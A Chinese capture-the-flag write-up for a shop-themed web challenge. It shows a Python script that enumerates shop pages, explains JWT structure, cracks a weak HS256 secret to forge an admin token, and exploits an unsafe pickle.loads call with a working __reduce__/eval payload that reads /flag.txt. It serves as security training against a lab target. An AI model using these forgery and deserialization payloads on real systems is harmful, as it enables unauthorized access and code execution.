小黑子题目，看到有一行提示：

`ikun们冲鸭,一定要买到lv6!!!`

加上下面是各种等级的购买页面，我们要找到lv6购买

首先注册一个账号然后登录，

![image-20250916095413188](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250916095413188.png)

有余额就意识到想买没那么简单，钱估计是不够的。

改变销售页面的参数是`/shop?page=1`，我们爆破page的值，直到找到lv6为止

```python
import requests

base_url = 'http://548940ec-2162-4653-8de1-370f9853636e.node5.buuoj.cn:81/shop?page={}'

for i in range(1,500):
    payload = base_url.format(i)
    r = requests.get(url=payload)
    if 'lv6.png' in r.content.decode():
        print(f"find lv6 in page {i}")
        break
        
        
find lv6 in page 181
```

![image-20250916100101685](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250916100101685.png)

果然是买不起的，我们先点购买抓包看看

![image-20250916101248020](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250916101248020.png)

看到cookie中有JWT字段，那我们目的就是破解这个JWT了

先讲讲JWT，它的全称是JSON WEB TOKEN。它的出现是为了解决无状态问题，从在服务端用session存储信息变成在客户端用JWT存放。JWT 由三部分组成，用点号（.）分隔，格式为：`Header.Payload.Signature`

header通常包含下面两个值

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

要base64编码一下

payload是数据载荷，就是你要传输的数据：

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022
}
```

也要base64加密

最后是最重要的，就是用在header中 声明的算法进行签名，一般如下

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

这个密钥只要服务器知道，服务器拿到JWT后用密钥对前两部分计算签名，如果和JWT中的签名一样，就认为数据没有被篡改

注意两点：

1. JWT前两部分都是只base64编码，本质就是明文传输，不能保密
2. JWT最大问题是服务器签发后不能收回，因此要设置一个有效期

这里我们的目标就是爆破出密钥，然后修改payload。对JWT前两部分进行base64解码，如下：

```
b'{"alg":"HS256","typ":"JWT"}'
b'{"username":"orange"}'
```

目标应该就是username，改成admin，我们来爆破密钥

这里使用了一个工具c-jwt-cracker

![image-20250916112243779](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250916112243779.png)

密钥是`1Kun`

我们重新构造一个用户名为admin的JWT，然后修改discount折扣，即可访问重定向到的/b1g_m4mber

源码中给了zip备份，下载审计源码

```
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

在admin.py中有这样一段代码，其中`p = pickle.loads(urllib.unquote(become))`而become是我们可控的。这就形成了一个pickle反序列化漏洞。我们利用`__reduce__`也就是R指令写入：

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

填充一下become字段即可获得flag